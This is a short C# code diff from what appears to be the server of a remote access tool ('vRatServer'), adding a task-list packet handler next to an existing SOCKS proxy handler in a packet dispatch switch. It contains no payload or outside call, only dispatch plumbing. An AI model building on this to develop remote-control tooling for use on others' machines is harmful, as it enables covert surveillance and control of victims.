@@ -67,7 +67,10 @@ namespace vRatServer.Classes
                 case (byte)globals.PacketType.socksdata:
                     new ClientProxy(client, data, idp);
                     break;
-                  default:
+                case (byte)globals.PacketType.tasklist:
+                    new TaskManagerPacket(client, data);
+                    break;
+                default:
                     break;
 
 
